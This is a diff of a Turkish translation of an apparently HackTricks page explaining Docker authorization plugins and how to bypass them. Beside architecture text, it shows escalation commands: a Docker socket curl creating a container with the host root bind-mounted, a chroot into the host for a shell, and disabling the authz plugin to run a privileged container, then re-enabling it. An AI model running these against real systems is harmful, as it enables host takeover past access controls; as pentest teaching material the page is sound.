@@ -1,14 +1,14 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon'a erişim izni olan herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Bu, daemon ile iletişim kurmak için Docker’ın Engine API'sini kullanan çağrılar için de geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
+**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiç** şeklindedir. Docker daemon'a erişim izni olan herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Bu, daemon ile iletişim kurmak için Docker’ın Engine API'sini kullanan çağrılar için de geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
 
 # Temel mimari
 
-Docker Auth eklentileri, Docker Daemon'a **istek** yapılan **hareketleri** **izin verme/red etme** amacıyla kullanabileceğiniz **harici** **eklenti**lerdir; bu, isteği yapan **kullanıcıya** ve **istenen** **harekete** bağlıdır.
+Docker Auth eklentileri, Docker Daemon'a **isteklerde bulunan** **kullanıcıya** ve **istenen** **işleme** bağlı olarak **hareketleri** **izin verme/red etme** amacıyla kullanabileceğiniz **harici** **eklenti**lerdir.
 
 **[Aşağıdaki bilgi belgelerden alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Bir **HTTP** **isteği**, CLI üzerinden veya Engine API aracılığıyla Docker **daemon**'ına yapıldığında, **kimlik doğrulama** **alt sistemi** isteği kurulu **kimlik doğrulama** **eklenti**(ler)ine **gönderir**. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararını vermekten sorumludur.
+Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API'si üzerinden Docker **daemon**'una yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine **gönderir**. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
 
 Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akışını göstermektedir:
 
@@ -18,19 +18,19 @@ Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akı�
 
 Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini** içerir. Sadece **kullanıcı adı** ve kullanılan **kimlik doğrulama yöntemi** eklentiye iletilir. En önemlisi, **hiçbir** kullanıcı **kimlik bilgisi** veya token iletilmez. Son olarak, **tüm istek/yanıt gövdeleri** yetkilendirme eklentisine gönderilmez. Sadece `Content-Type`'ı `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.
 
-HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`), örneğin `exec`, için yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. `logs` ve `events` gibi parça parça HTTP yanıtı döndüren komutlar için yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
+HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`), örneğin `exec`, için yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar, örneğin `logs` ve `events`, için yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
 
-İstek/yanıt işleme sırasında, bazı yetkilendirme akışlarının Docker daemon'a ek sorgular yapması gerekebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırması için gerekli araçları sağlaması gerekir.
+İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon'a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırması için gerekli araçları sağlaması gerekir.
 
 ## Birkaç Eklenti
 
-**Eklentinizi** Docker daemon **başlatma** sürecinin bir parçası olarak **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları bir araya getirebilirsiniz**. Bu zincir sıralı olabilir. Daemon'a yapılan her istek, sırayla zincirden geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
+**Eklentinizi** Docker daemon **başlangıcı** sırasında **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları bir araya getirebilirsiniz**. Bu zincir sıralı olabilir. Daemon'a yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
 
 # Eklenti Örnekleri
 
 ## Twistlock AuthZ Broker
 
-Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** eklentinin **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her bir kullanıcının hangi API uç noktalarına erişebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.
+Eklenti [**authz**](https://github.com/twistlock/authz), **istekleri yetkilendirmek için** **okuyacağı** basit bir **JSON** dosyası oluşturmanıza olanak tanır. Bu nedenle, her API uç noktasının hangi kullanıcılar tarafından erişilebileceğini çok kolay bir şekilde kontrol etme fırsatı sunar.
 
 Bu, Alice ve Bob'un yeni konteynerler oluşturmasına izin verecek bir örnektir: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
@@ -122,7 +122,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 
 ### HostConfig'deki Binds
 
-**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
+**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine yapın:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
@@ -167,9 +167,9 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Eskalasyondan sonra **plugin'i yeniden etkinleştirmeyi unutmayın**, aksi takdirde **docker servisi yeniden başlatılamayacaktır**!
+Eskalasyondan sonra **eklentiyi yeniden etkinleştirmeyi unutmayın**, aksi takdirde **docker hizmetinin yeniden başlatılması işe yaramayacaktır**!
 
-## Auth Plugin Bypass yazıları
+## Auth Eklenti Atlatma yazıları
 
 - [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
